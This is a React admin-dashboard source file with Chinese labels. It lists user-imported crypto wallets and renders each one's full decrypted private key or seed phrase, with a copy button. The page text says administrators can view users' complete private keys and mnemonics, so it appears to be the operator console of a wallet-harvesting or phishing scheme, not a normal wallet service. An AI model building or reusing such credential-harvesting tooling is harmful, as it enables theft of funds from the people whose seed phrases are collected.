"use client";

import { useEffect, useState } from "react";
import { Copy, Check } from "lucide-react";

interface WalletRow {
  id: string;
  address: string;
  importType: string;
  chainId: number | null;
  credential: string | null;
  credentialStatus: "ok" | "missing" | "decrypt_failed";
  connectedAt: string;
  disconnectedAt: string | null;
}

function CredentialCell({
  credential,
  status,
  importType,
}: {
  credential: string | null;
  status: WalletRow["credentialStatus"];
  importType: string;
}) {
  const [copied, setCopied] = useState(false);

  if (status === "ok" && credential) {
    const label = importType === "mnemonic" ? "助记词" : "私钥";
    return (
      <div className="space-y-2">
        <span className="text-[10px] uppercase tracking-wide text-[var(--admin-muted)]">
          {label}
        </span>
        <div className="rounded-md border border-[var(--admin-border)] bg-[var(--admin-bg)] p-2.5">
          <code className="block break-all font-mono text-xs leading-relaxed text-[var(--admin-fg)]">
            {credential}
          </code>
        </div>
        <button
          type="button"
          onClick={async () => {
            await navigator.clipboard.writeText(credential);
            setCopied(true);
            setTimeout(() => setCopied(false), 2000);
          }}
          className="inline-flex items-center gap-1 rounded-md border border-[var(--admin-border)] px-2 py-1 text-xs text-[var(--admin-muted)] transition hover:border-[var(--admin-accent)] hover:text-[var(--admin-accent)]"
        >
          {copied ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
          {copied ? "已复制" : "复制"}
        </button>
      </div>
    );
  }

  if (status === "decrypt_failed") {
    return <span className="text-red-400">解密失败，请检查 ENCRYPTION_KEY</span>;
  }

  return <span className="text-[var(--admin-muted)]">无凭证（用户尚未同步导入）</span>;
}

export default function WalletsPage() {
  const [wallets, setWallets] = useState<WalletRow[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetch("/api/wallets")
      .then((res) => res.json())
      .then((data) => {
        setWallets(data);
        setLoading(false);
      })
      .catch(() => setLoading(false));
  }, []);

  return (
    <div className="mx-auto max-w-6xl space-y-6">
      <div>
        <h1 className="text-xl font-semibold">钱包记录</h1>
        <p className="text-sm text-[var(--admin-muted)]">
          用户导入的钱包数据，凭证加密存储，管理员可查看完整私钥 / 助记词
        </p>
      </div>

      <div className="admin-panel overflow-x-auto">
        <table className="w-full min-w-[960px] text-left text-sm">
          <thead>
            <tr className="border-b border-[var(--admin-border)] text-xs text-[var(--admin-muted)]">
              <th className="px-5 py-3">地址</th>
              <th className="px-5 py-3">导入方式</th>
              <th className="px-5 py-3">链 ID</th>
              <th className="min-w-[320px] px-5 py-3">导入内容</th>
              <th className="px-5 py-3">连接时间</th>
              <th className="px-5 py-3">断开时间</th>
              <th className="px-5 py-3">状态</th>
            </tr>
          </thead>
          <tbody>
            {loading ? (
              <tr>
                <td colSpan={7} className="px-5 py-8 text-center text-[var(--admin-muted)]">
                  加载中…
                </td>
              </tr>
            ) : wallets.length === 0 ? (
              <tr>
                <td colSpan={7} className="px-5 py-8 text-center text-[var(--admin-muted)]">
                  暂无钱包记录
                </td>
              </tr>
            ) : (
              wallets.map((w) => (
                <tr key={w.id} className="border-b border-[var(--admin-border)]/60 align-top">
                  <td className="px-5 py-3 font-mono text-xs">{w.address}</td>
                  <td className="px-5 py-3">
                    {w.importType === "mnemonic" ? "助记词" : "私钥"}
                  </td>
                  <td className="px-5 py-3">{w.chainId ?? "—"}</td>
                  <td className="max-w-lg px-5 py-3">
                    <CredentialCell
                      credential={w.credential}
                      status={w.credentialStatus}
                      importType={w.importType}
                    />
                  </td>
                  <td className="px-5 py-3 text-xs text-[var(--admin-muted)]">
                    {new Date(w.connectedAt).toLocaleString("zh-CN")}
                  </td>
                  <td className="px-5 py-3 text-xs text-[var(--admin-muted)]">
                    {w.disconnectedAt
                      ? new Date(w.disconnectedAt).toLocaleString("zh-CN")
                      : "—"}
                  </td>
                  <td className="px-5 py-3">
                    <span
                      className={`admin-badge ${w.disconnectedAt ? "admin-badge-muted" : "admin-badge-active"}`}
                    >
                      {w.disconnectedAt ? "已断开" : "已连接"}
                    </span>
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
}
